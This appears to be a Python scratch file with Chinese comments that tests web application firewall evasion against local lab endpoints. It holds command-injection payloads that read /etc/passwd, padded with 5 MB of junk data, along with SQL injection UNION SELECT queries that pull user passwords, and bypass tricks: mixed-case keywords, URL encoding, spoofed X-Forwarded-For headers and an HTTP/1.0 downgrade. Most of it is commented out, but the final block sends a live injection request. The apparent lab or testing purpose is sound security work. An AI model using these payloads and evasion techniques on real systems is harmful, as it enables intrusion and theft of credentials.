# # # import requests

# # # headers = {
# # #     'Host': '127.0.0.1:9004',
# # #     # 'Content-Length': '23',
# # #     'Cache-Control': 'max-age=0',
# # #     'Upgrade-Insecure-Requests': '1',
# # #     # 'Origin': 'http://127.0.0.1:9004',
# # #     'Content-Type': 'application/x-www-form-urlencoded',
# # #     'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
# # #     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
# # #     # 'Referer': 'http://127.0.0.1:9004/',
# # #     # 'Accept-Encoding': 'gzip, deflate, br',
# # #     'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7',
# # #     'Connection': 'close',
# # # }
# # # padding_data = 'x' * 1024 * 1024 * 5  # 5 MB 的无用数据

# # # data = {'cmd': 'echo ' + padding_data +';cat /etc/passwd'}


# # # response = requests.post('http://127.0.0.1:9004/rce_post', headers=headers, data=data, verify=False)
# # # print(response.text)    
# # # print(response.status_code)
# # # 将字符串转换为 Unicode 编码形式
# # import urllib.parse

# # def unicode_encode(s):
# #     return urllib.parse.quote(s)

# # import requests

# # headers = {
# #     # 'Host': 'waf:9001',
# #     # 'Content-Length': '64',
# #     'Cache-Control': 'max-age=0',
# #     'Upgrade-Insecure-Requests': '1',
# #     # 'Origin': 'http://waf:9001',
# #     'Content-Type': 'application/x-www-form-urlencoded',
# #     'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
# #     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
# #     # 'Referer': 'http://waf:9001/',
# #     # 'Accept-Encoding': 'gzip, deflate, br',
# #     'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7',
# #     'Connection': 'close',
# # }

# # # data = {
# # #     'id': '1 UNION SELECT null, password FROM users WHERE id = 1 -- ',
# # # }

# # raw_string = "1 UNION SEL%ECT null, password FROM users WHERE id = 1 -- "
# # unicode_string = unicode_encode(raw_string)
# # unicode_string = raw_string
# # print(unicode_string)
# # data = {
# #     'id': unicode_string,
# # }

# # response = requests.post('http://localhost:8001/sqli_post', headers=headers, data=data, verify=False)
# # print(response.text)    
# # print(response.status_code)

# # # # 测试字符串
# # # test_string = "password"

# # # # 转换为 Unicode 编码形式
# # # encoded_password = unicode_encode(test_string)
# import http.client
# import urllib.parse
# headers = {
#     'Host': 'waf:9001',
#     'Upgrade-Insecure-Requests': '1',
#     'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
#     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
#     'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7',
#     'Connection': 'close',
#     # 添加一些可能影响WAF检测的头部
#     'X-Forwarded-For': '192.168.0.1',  # 模拟代理服务器
#     'X-Originating-IP': '127.0.0.1',    # 模拟源IP地址
# }

# # 对URL进行部分编码以绕过检测
# url = 'http://localhost:9004/sqli_get?id=1%20UnIoN%20SeLeCt%20null,%20password%20FrOm%20users%20WhErE%20id%20=%201%20--'

# parsed_url = urllib.parse.urlparse(url)
# host = parsed_url.hostname
# port = parsed_url.port if parsed_url.port else 80
# path = parsed_url.path
# if parsed_url.query:
#     path += '?' + parsed_url.query
# print(host, port, path)
# # 创建HTTP连接

# conn = http.client.HTTPConnection(host, port)
# conn._http_vsn = 10
# conn._http_vsn_str = 'HTTP/1.0'
# # encoded_param_value = 'cat%20/etc/passwd'
# # mutated_path = f'/vulnerable_endpoint?cmd={encoded_param_value}'

# # 发送OPTIONS请求
# conn.request('POST', path, headers=headers)

# # 获取响应
# response = conn.getresponse()
# print(response.status, response.reason)
# print(response.read().decode())

# # 关闭连接
# conn.close()
import requests
from urllib.parse import urlparse, parse_qs

# 假设这是你的 GET 请求 URL
get_url = "http://localhost:9001/sqli_post?id=1%20UNION%20SELECT%20null,%20password%20FROM%20users%20WHERE%20id%20=%201%20--"

# 解析 URL 和查询参数
parsed_url = urlparse(get_url)
get_params = parse_qs(parsed_url.query)

# 构建新的 POST 请求
post_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
post_data = {k: v[0] for k, v in get_params.items()}  # 将查询参数变成 POST 数据

print(post_url)
print(post_data)
# 发送 POST 请求
response = requests.post(post_url, data=post_data)

# 输出响应内容
print(response.status_code)
print(response.text)
